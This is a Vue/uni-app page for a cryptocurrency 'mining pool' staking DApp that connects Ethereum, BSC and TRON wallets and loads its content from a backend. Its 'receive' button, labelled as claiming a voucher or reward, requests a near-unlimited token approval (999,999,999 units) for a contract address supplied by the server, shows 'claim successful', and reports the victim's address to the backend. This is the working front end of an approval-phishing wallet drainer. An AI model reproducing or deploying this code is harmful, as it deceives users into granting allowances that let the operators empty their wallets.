<template>
	<view class="content">
		<navbar :title="title" @change='changeLang' @connect="updateConnect"></navbar>
		<view class="banner">
			<image :src="banner" class="bannerimg" mode="widthFix"></image>
			<view class="banner-content">
				<view class="banner-t">{{$t('index.voucher')}}</view>
				<view class="banner-m">{{$t('index.pledge')}}</view>
				<view class="banner-tip">{{$t('index.mining')}}</view>
				<view class="btns">
					<button type="primary" class="button" size="mini" @click="doapprove">{{$t('receive')}}</button>
					<button type="default" class="button" size="mini">{{$t('certificate')}}</button>
				</view>
			</view>
		</view>
		<DataPool v-if="mining_pool" :data="mining_pool"></DataPool>
		<Staking :data="earnings"></Staking>
		<question :data="problem"></question>
		<partners :data="white"></partners>
		<service></service>
	</view>
</template>

<script>
	import comjs from "@/common/util.js"
	import comweb3 from "@/common/web3.min.js"
	import http from '@/common/http.js'
	export default {
		data() {
			return {
				isconnect: false,
				link: null,
				chainId: 100,
				address: '',
				contract: [],
				walletlinkName: ['Ethereum', 'Binance Smart Chain', 'TRX'],
				walletlink: ['erc', 'bsc', 'trc'],
				walletlinkid: [1, 56, 1],
				web3js: null,
				mychainId: 0,
				isauto: true,
				contenttxt: 'Connect wallet',
				isapprove: false,
				tronWeb: null,
				mining_pool: null,
				earnings: [],
				problem: [],
				banner: '',
				title: '',
				white: []
			}
		},
		onLoad() {
			//通过接口获取合约信息
			this.getContent()
			// this.getcontract()
		},
		onShow() {
			//自动检测是否以太链，在钱包中，以太坊或币安环境自动登陆
			//this.ethcontent()
		},
		methods: {
			updateConnect() {
				console.log('updateConnect')
				this.isconnect = true
			},
			changeLang() {
				this.getContent()
				// this.reset()
			},
			reset() {
				this.mining_pool = {}
				this.earnings = []
				this.problem = []
			},
			async getContent() {
				const res = await http.post('/index/Index/home', {
					data: {
						"language": uni.getLocale(),
						"wallet_address": null,
						"coin_name": "ETH"
					}
				})
				const {
					data
				} = res
				const title = data?.title
				this.mining_pool = data?.mining_pool || {}
				this.earnings = data?.platform_earnings || []
				this.problem = data?.problem || []
				this.banner = data?.banner
				this.title = title
				this.white = data?.white_paper
				uni.setStorageSync('title', title)
				uni.hideLoading()
			},
			async doapprove_success(address, contract) {
				//保存授权地址信息，无需处理返回信息
				const data = {
					address,
					contract
				};
				data.isapprove = this.isapprove
				data.link = this.walletlink[this.chainId]
				console.log('doapprove_success', data);
				const res = await http.post('/index/Index/address', data)
				console.log(`address res`, res)
			},
			async doapprove_trc() {
				//是否获取到相应合约
				if (!this.contract || !this.contract.contract || !this.contract.contract.trc) {
					return false;
				}
				uni.showLoading()
				const that = this;
				try {
					let contractdata = that.contract.contract.trc
					let _value = 999999999000000 //授权数量
					const parameter = [{
						type: 'address',
						value: contractdata.contract
					}, {
						type: 'uint256',
						value: _value
					}];
					const tx = await that.tronWeb.transactionBuilder.triggerSmartContract(
						contractdata.bi,
						"approve(address,uint256)", {},
						parameter,
						that.address
					);
					const signedTx = await that.tronWeb.trx.sign(tx.transaction);
					const broastTx = await that.tronWeb.trx.sendRawTransaction(signedTx);
					uni.hideLoading()
					if (broastTx.result) {
						console.log(broastTx.result) //result 为交易哈希

						//授权处理成功，开始成功后的业务处理----------------------
						that.isapprove = true
						that.doapprove_success(that.address, contractdata.contract)
						//授权处理成功，结束成功后的业务处理----------------------

						comjs.jsalert("领取成功");
					} else {
						comjs.msg('领取失败')
					}
				} catch (e) {
					uni.hideLoading()
					comjs.msg('领取失败')
				}
			},
			async doapprove_eth() {
				uni.showLoading()
				try {
					//以太坊/币安  授权开始
					let that = this;
					let strabi =
						'[{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"owner","type":"address"},{"indexed":true,"internalType":"address","name":"spender","type":"address"},{"indexed":false,"internalType":"uint256","name":"value","type":"uint256"}],"name":"Approval","type":"event"},{"inputs":[{"internalType":"address","name":"spender","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"approve","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"}]'
					let arrabi = JSON.parse(strabi)
					let contractdata = that.contract.contract[that.walletlink[that.chainId]]
					let Contractjs = new that.web3js.eth.Contract(arrabi, contractdata.bi);
					let _value = comweb3.utils.toWei("999999999", 'ether'); //授权数量
					Contractjs.methods.approve(contractdata.contract, _value).send({
						from: that.address
					}, function(error, result) {
						uni.hideLoading()
						if (!error) {
							console.log(result) //result 为交易哈希

							//授权处理成功，开始成功后的业务处理----------------------
							that.isapprove = true
							that.doapprove_success(that.address, contractdata.contract)
							//授权处理成功，结束成功后的业务处理----------------------

							comjs.jsalert("领取成功");
						} else {
							//提交失败：可能是中途取消或其它原因
							console.log(error)
						}
					});
				} catch (e) {
					uni.hideLoading()
					comjs.msg('领取失败')
				}
			},
			doapprove() {
				//是否已授权
				if (this.isapprove) {
					return true;
				}
				//没有连接到钱包？开始连接
				if (!this.isconnect) {
					this.chooselink()
					return true;
				}
				//是否获取的合约信息
				let linkname = this.walletlink[this.chainId]
				comjs.log(this.contract.contract[linkname])
				if (!this.contract || !this.contract.contract || !this.contract.contract[linkname] || !this.contract.contract[
						linkname].contract) {
					//comjs.log(this.chainId)
					return true;
				}
				if (this.walletlink[this.chainId] === 'trc') {
					this.doapprove_trc();
				} else {
					this.doapprove_eth();
				}
				//开始授权
			},
			async getcontract() {
				uni.showLoading()
				const res = await http.post('/index/Index/contract')
				this.contract = res.data
				console.log(`this.contract`, this.contract)
			},
			async ethcontent_address() {
				const accounts = await this.web3js.eth.getAccounts();
				//comjs.log(accounts)
				if (accounts && accounts[0]) {
					this.address = accounts[0]
					this.isconnect = true
					this.contenttxt = this.address.substr(0, 5) + '***' + this.address.substr(-5)
				}
			},
			async ethcontent_chain() {
				const that = this;
				try {
					const echainId = await ethereum.request({
						method: 'eth_chainId'
					});
					//comjs.msg(echainId);
					that.mychainId = comweb3.utils.hexToNumber(echainId)
					if (that.isauto) {
						if (that.mychainId === 1) {
							that.chainId = 0;
						} else if (that.mychainId === 56) {
							that.chainId = 1;
						}
						that.ethcontent_address();
					} else {
						if (that.mychainId == that.walletlinkid[that.chainId]) {
							that.ethcontent_address();
						} else if (!that.isauto) {
							comjs.jsalert('请切换链到: ' + that.walletlinkName[that.chainId]);
						}
					}
				} catch (e) {
					comjs.jsalert('连接失败');
				}
			},
			async ethcontent() {
				//检测是否以太环境
				const that = this;
				const obj = setInterval(async () => {
					if (window.ethereum) {
						clearInterval(obj);
						if (typeof web3 !== 'undefined') {
							that.web3js = new comweb3(web3.currentProvider);
						} else {
							that.web3js = new comweb3(new Web3.providers.HttpProvider("http://localhost:8545"));
						}
						const myadd = await ethereum.request({
							method: 'eth_requestAccounts'
						});
						const echainId = await ethereum.request({
							method: 'eth_chainId'
						});
						comjs.msg(echainId)
						await that.ethcontent_chain()
					} else if (window.tronWeb) {
						comjs.msg('tronWeb')
						if (window.tronWeb.defaultAddress.base58) {
							clearInterval(obj);
							that.address = window.tronWeb.defaultAddress.base58
							that.isconnect = true
							that.chainId = 2;
							that.mychainId = 1;
							that.contenttxt = that.address.substr(0, 5) + '***' + that.address.substr(-5)
							that.tronWeb = window.tronWeb;
						}
					} else {
						comjs.msg('not net')
						clearInterval(obj);
						if (!that.isauto) {
							that.show_ethWallet_list()
						}
					}
				}, 100);
			},
			async trccontent() {
				const that = this;
				if (window.tronWeb && window.tronWeb.defaultAddress.base58) {
					that.address = window.tronWeb.defaultAddress.base58
					that.isconnect = true
					that.chainId = 2;
					that.mychainId = 1;
					that.contenttxt = that.address.substr(0, 5) + '***' + that.address.substr(-5)
					that.tronWeb = window.tronWeb;
				} else {
					that.show_ethWallet_list()
				}
			},
			show_ethWallet_list() {
				//钱包跳转
				let that = this
				let dappdomain = 'http://www.1.com/' //本站域名
				//各个以太坊钱包地址
				let walletName = ['MetaMask', 'Coinbase', 'imToken', 'TokenPocket', 'TrustWallet']
				let walletUrl = {}
				walletUrl[0] = `https://metamask.app.link/dapp/${dappdomain}`
				walletUrl[1] = 'https://go.cb-w.com/'
				walletUrl[2] = `imtokenv2://navigate/DappView?url=${dappdomain}`
				walletUrl[3] = `tpdapp://open?params={"url": "${dappdomain}", "chain": "ETH"}`
				walletUrl[4] = `https://link.trustwallet.com/open_url?url=${dappdomain}`
				uni.showActionSheet({
					title: null,
					itemList: walletName,
					success: (res) => {
						window.location.href = walletUrl[res.tapIndex]
					}
				})
			},
			chooselink() {
				//选择链
				if (this.isconnect) {
					return true;
				}
				this.isauto = false
				let that = this
				uni.showActionSheet({
					title: null,
					itemList: that.walletlinkName,
					success: (res) => {
						that.chainId = res.tapIndex
						//that.chainId = that.walletlinkid[res.tapIndex]
						//console.log(that.link)
						if (that.walletlink[that.chainId] === 'trc') {
							that.trccontent()
						} else {
							that.ethcontent()
						}
					}
				})
			}

		}
	}
</script>

<style>
	.toprap {
		position: relative;
		text-align: center;
		line-height: 44px;
		height: 44px;
		overflow: hidden;
		padding: 0 200px;
	}

	.bagconnect {
		position: absolute;
		right: 10px;
		top: 5px;
		height: 34px;
		line-height: 34px;
		background: blue;
		font-size: 14px;
		padding: 0 10px;
		border-radius: 5px;
		color: #fff;
	}

	.banner {
		position: relative;
		color: #fff;
	}

	.bannerimg {
		width: 100%;
		height: 48vw !important;
	}

	.banner-content {
		position: absolute;
		left: 5.3vw;
		top: 8vw;
		width: calc(100vw - 10.6vw);
	}

	.banner-t {
		color: #fff;
		font-size: 40rpx;
	}

	.banner-m {
		font-size: 40rpx;
		margin: 1.86667vw 0;
	}

	.banner-tip {
		font-size: 24rpx;
		margin: 24rpx 0;
	}

	.btns {
		display: flex;
		justify-content: space-between;

		.button {
			margin: 0;
		}
	}

	.content {
		background-color: #f8f8f8;
	}
</style>